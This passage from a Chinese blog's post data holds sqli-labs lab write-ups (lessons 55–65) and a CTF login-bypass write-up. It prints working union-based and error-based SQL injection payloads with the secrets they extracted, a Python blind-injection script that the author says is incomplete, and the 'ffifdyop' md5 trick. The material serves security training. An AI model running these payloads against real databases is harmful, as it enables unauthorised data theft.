告诉了测试次数14次， union测试 数据库challenges\n第一次挑战 失败 \n' \" ') \") 均没有回显 初次猜测报错注入或者双注\n第二次尝试\n) 闭合\n获取表\n=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges' %23 // True UBU4QNRHHP\n获取列\nid=0) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='UBU4QNRHHP' %23 //true\n// secret_6H3B\n获取key\n0) union select 1,2,group_concat(secret_6H3B) from UBU4QNRHHP %23\nmLjAsOZnSEbQqIMybw1AnUYH\n```\n\n## Less-56 GET-challenge-Union-14 queries allowed-Variation 3\n\n```\n这次老老实实绕过\nid=1' %23 // False\nid=1\" %23 // True 但是注入 union报错\n添加为\nid=1' union select 1,2,3 %23 // False\nid=1\" union select 1,2,3 %23 //False\nid=1') union select 1,2,3 %23 \n获取表\n0%27)%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23 \nKOUNR4QC6G\n获取列\n0') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='KOUNR4QC6G'%23\nsecret_3EVD\n获取key\n0') union select 1,2,group_concat(secret_3EVD) from KOUNR4QC6G %23\nKcU87wBerjRPTHsvWBL6Zpx1\n\n```\n\n## Less-57 GET-challenge-Union-14 queries allowed-Variation 4\n\n```\n做法 和之前一样\n0\" union select 1,2,3 %23\n通过改变0之后的值达到闭合的目的\n\n获取表\n0\" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'%23\nVAFBXAV18O\n获取列\n0\" union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='VAFBXAV18O'%23\nsecret_G8PM\n获取key\n0\" union select 1,2,group_concat(secret_G8PM) from VAFBXAV18O %23\ndRwHUUQ2TXSGUZ556g7FikFJ\n```\n\n## Less-58 GET-challenge-Double Query-5 queries allowed-Variation 1\n\n```\n这道题 不看题目可能需要测好久\n这次使用双注来报错查询\nhttp://192.168.64.135/Less-58/?id=1%27and%20%271%27=%271 // True 绕过\n\n获取表\n1'and (select count(*) from information_schema.tables group by concat('~',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'~',floor(rand(0)*2))) %23\n5H512U9U27\n获取列\n1'and (select count(*) from information_schema.tables group by concat('~',(select column_name from information_schema.columns where table_schema=database() and table_name='5H512U9U27' limit 2,1),'~',floor(rand(0)*2))) %23\nsecret_DD13\n获取key\n1'and (select count(*) from information_schema.tables group by concat('~',(select secret_BJYY from 9JMRBSMHB3 limit 0,1),'~',floor(rand(0)*2))) %23\nfJw5d5MfwbirBtiV6ajyMVYL\n```\n\n## Less-59 GET-challenge-Double Query-5 queries allowed-Variation 2\n\n```\n先测试类型\n有报错，可以注入\n这次不需要过滤 \n获取表\n1 and (select count(*) from information_schema.tables group by concat('~',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'~',floor(rand(0)*2))) %23\nN6JFY84247\n获取列\n1 and (select count(*) from information_schema.tables group by concat('~',(select column_name from information_schema.columns where table_schema=database() and table_name='N6JFY84247' limit 2,1),'~',floor(rand(0)*2))) %23\nsecret_FWQ3\n获取key\n1 and (select count(*) from information_schema.tables group by concat('~',(select secret_FWQ3 from N6JFY84247 limit 0,1),'~',floor(rand(0)*2))) %23\nVlWMK389WVuIephCe46vDls5\n```\n\n## Less-60 GET-challenge-Double Query-5 queries allowed-Variation 3\n\n```\n测试 单引号 双引号 ) ') \") 发现\") 闭合 绕过\n\n获取表\nhttp://192.168.64.135/Less-60/?id=1%22)%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),%27~%27,floor(rand(0)*2)))%20%23\n5H36JXB2F0\n获取 列\nhttp://192.168.64.135/Less-60/?id=1%22)%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%275H36JXB2F0%27%20limit%202,1),%27~%27,floor(rand(0)*2)))%20%23\nsecret_NFL6\n获取key\nhttp://192.168.64.135/Less-60/?id=1%22)%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20secret_NFL6%20from%205H36JXB2F0%20limit%200,1),%27~%27,floor(rand(0)*2)))%20%23\n49DYkkaArpuMaYb5ITI6NYlP\n```\n\n## Less-61 GET-challenge-Double Query-5 queries allowed-Variation 4\n\n```\n通过1' 判断闭合\n\n获取表\n1%\n27))%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),%27~%27,floor(rand(0)*2)))%20%23\nEKP9EVPEDH\n获取列\n1')) and (select count(*) from information_schema.tables group by concat('~',(select column_name from information_schema.columns where table_schema=database()%20 and table_name='EKP9EVPEDH' limit 2,1),'~',floor(rand(0)*2))) %23\nsecret_DI64\n获取key\n1')) and (select count(*) from information_schema.tables group by concat('~',(select secret_DI64 from EKP9EVPEDH ),'~',floor(rand(0)*2))) %23\n8r5XPen1KywllEINiQfAQnlq\n```\n\n## Less-62 GET-challenge-Blind- 130 queries allowed -variation 1\n\n```\n这里面还有盲注，坑啊， 这里就只测试注入点\n剩下的大家自己完成，这里发现sqlmap测试，不会导致页面重置，超过130次还可以执行\n获取注入点1') %23\n这里尝试写脚本试试\n\n先写个爆破数据库的 \n## 这里通过 ') %23 可构成闭合\n\nfrom urllib import request\nfrom urllib import parse\nimport  re\n\nurl ='http://192.168.64.135/Less-62/?id='\n\n# length\nnum = 0\nfor i in range(1,20):\n    num +=1\n    param = '1 \\') and (length(database())='+str(i)+') #'\n    response = request.urlopen(url+parse.quote(param)).read().decode()\n    if (re.search(\"Angelina\",response)):\n        print(\"length:\" + str(i))\n        break\n\ndatabase = \"\"\nfor i in range(10):\n    a = b =64\n    while True:\n        num +=1\n        b = int(b/2)\n        param = '1 \\')  and (ascii(substr(database(),'+str(i+1)+',1))<'+str(a)+') #'\n        response = request.urlopen(url+parse.quote(param)).read().decode()\n        #print(url+parse.quote(param))\n        if (re.search(\"Angelina\", response)):\n            a -=b\n        else:\n            param = '1 \\')  and (ascii(substr(database(),' + str(i+1) + ',1))=' + str(a) + ') #'\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            #print(url + parse.quote(param))\n            if (re.search(\"Angelina\", response)):\n                database +=chr(a)\n                break\n            else:\n                a +=b\n\nprint(database)\n\n之后爆破表 这一题写个完整的，之后就简略的写出注入点，\n爆破表，拿上面的修修改改\n通过检查，先确定表的长度，再去爆破\n爆破前记得重置，因为130次比较少\n# 查表的数量\ntable_num = 0\n\nwhile True:\n    param = \"1 ') and (select count(*) from information_schema.tables where table_schema=database())=\"+str(table_num)+\" #\"\n    response = request.urlopen(url + parse.quote(param)).read().decode()\n    print(url+parse.quote(param))\n    if (re.search(\"Angelina\",response)):\n        print(\"table_num:\"+str(table_num))\n        break\n    else:\n        table_num += 1\nprint(table_num)\n\n# # 确定表的长度\ntable_length = 0\nwhile True:\n    param = '1 \\') and length(substr((select table_name from information_schema.tables where table_schema=database()),1))='+str(table_length)+' #'\n    response = request.urlopen(url+parse.quote(param)).read().decode()\n    print(url+parse.quote(param))\n    if (re.search(\"Angelina\", response)):\n        print(\"table_num:\" + str(table_length))\n        break\n    else:\n        table_length += 1\n\n# 获取表名\ntable_name=\"\"\nfor i in range(1,11):\n    a=b=64\n    while True:\n        b= int(b/2)\n        param = '1 \\')  and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),'+str(i)+',1))<'+str(a)+') #'\n        response = request.urlopen(url+parse.quote(param)).read().decode()\n        print(url+parse.quote(param))\n        if (re.search(\"Angelina\", response)):\n            a -=b\n        else:\n            param = '1 \\')  and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),'+str(i)+',1))=' + str(a) + ') #'\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            print(url + parse.quote(param))\n            if (re.search(\"Angelina\", response)):\n                table_name +=chr(a)\n                break\n            else:\n                a +=b\n\nprint(table_name)\n\nJ8CLO25SRR\n\n最后查列，这里发现写的脚本比较费时，所以稍微修改一下\ncolumn_name =\"\"\nfor i in range(7,11):\n    a=b=64\n    while True:\n        b= int(b/2)\n        param = '1 \\')  and (ascii(substr((select table_name from information_schema.tables where table_name=\"'+str(table_name)+'\"),'+str(i)+',1))<'+str(a)+') #'\n        response = request.urlopen(url+parse.quote(param)).read().decode()\n        print(url+parse.quote(param))\n        if (re.search(\"Angelina\", response)):\n            a -=b\n        else:\n            param = '1 \\')  and (ascii(substr((select table_name from information_schema.tables where table_name=\"'+str(table_name)+'\"),'+str(i)+',1))=' + str(a) + ') #'\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            print(url + parse.quote(param))\n            if (re.search(\"Angelina\", response)):\n                column_name +=chr(a)\n                break\n            else:\n                a +=b\n#HKIR\nprint(column_name)\ncolumn_name = \"secret_\"+column_name\n\n# 查 key\nfor i in range(1,25):\n    a=b=64\n    while True:\n        b= int(b/2)\n        param = '1 \\')  and (ascii(substr((select '+column_name+' from '+table_name+'),'+str(i)+',1))<'+str(a)+') #'\n        response = request.urlopen(url+parse.quote(param)).read().decode()\n        print(url+parse.quote(param))\n        if (re.search(\"Angelina\", response)):\n            a -=b\n        else:\n            param = '1 \\')  and (ascii(substr((select '+column_name+' from '+table_name+')),'+str(i)+',1))=' + str(a) + ') #'\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            print(url + parse.quote(param))\n            if (re.search(\"Angelina\", response)):\n                key +=chr(a)\n                break\n            else:\n                a +=b\n# 这里脚本不满足复杂度，不能在130以内弄出来，作为参考，等我去翻翻算法，在回来改\n```\n\n## Less-63 GET-challenge-Blind- 130 queries allowed -variation 2\n\n```\n和上一题类似\n这里就判断注入类型，和如何闭合\n1' order by 4 %23\n通过判断 发现3 返回正常 4 错误\n所以之后的做法就和62 一样\n```\n\n## Less-64 GET-challenge-Blind- 130 queries allowed -variation 3\n\n```\n测试了 '  \" ) )) ') \") ')) \"))\n1)) order by 3 %23 闭合\n```\n\n## Less-65 GET-challenge-Blind- 130 queries allowed -variation 4\n\n```\n和上一题一样，通过测试闭合\n发现 \") 绕过 闭合 \n这里还有一种做法，将需要绕过的写入txt文件，之后通过burp去爆破，通过判断返回值也可以达到相同的效果\n\n```\n\n\n\n\n","tags":["sql注入"],"categories":["WEB安全"]},{"title":"后台登录","url":"/2019/10/04/CTF/实验吧/实验吧-web-后台登录/","content":"\n# 实验吧\n\n## web\n\n### 后台登录\n\n1.  burp抓包尝试爆破\n\n    一般呢，ctf题是不涉及爆破的，因为这样会导致服务器处理压力太大\n\n    <pre spellcheck=\"false\" class=\"md-fences md-end-block ty-contain-cm modeLoaded\" cid=\"n16\" mdtype=\"fences\" style=\"box-sizing: border-box; overflow: visible; font-family: var(--monospace); font-size: 0.9em; display: block; break-inside: avoid; text-align: left; white-space: normal; background-image: inherit; background-position: inherit; background-size: inherit; background-repeat: inherit; background-attachment: inherit; background-origin: inherit; background-clip: inherit; background-color: rgb(248, 248, 248); position: relative !important; border: 1px solid rgb(231, 234, 237); border-radius: 3px; padding: 8px 4px 6px; margin-bottom: 15px; margin-top: 15px; width: inherit;\" lang=\"js\"><!-- $password=$_POST['password'];\n     $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n     $result=mysqli_query($link,$sql);\n     if(mysqli_num_rows($result)>0){\n     echo 'flag is :'.$flag;\n     }\n     else{\n     echo '密码错误!';\n     } --></pre>\n\n    可以看到这里当我们输入正确的密码后，会返回flag。\n\n    那么我们的重点就是获取密码了\n\n2.  寻找密码\n\n    尝试了几次弱密码，注入都没有效果，之后突然看到url：[http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php](http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php)，发现文件名很怪异，之后尝试也发现了ffifdyop就是最终的密码\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175235.png)\n\n 拿到flag\n\n3.  解释\n\n    为什么ffifdyop就可以拿到flag，\n\n    ffifdop\n\n    md5:  276f722736c95d99e921722cf9ed621c\n\n    然后对其编码，这里刚好构成了注入条件\n\n    `‘or’6<tarsh>`\n\n    我们查看一个md5加密\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175244.png)\n\n  \n\n    content: 129581926211651571912466741651878684928\n    hex: 06da5430449f8f6f23dfc1276f722738\n    string: T0Do#'or'8\n\n---\n\n\n\n参考：https://www.jianshu.com/p/fc7ed10d1010\n\n之后查看也发现了我们需要构造一个可以绕过的字符串，所以这道题算是瞎猫逮着了，但是做题的目录就是理解，而不是为了做题而做题。","tags":["sql注入"],"categories":["CTF"]}]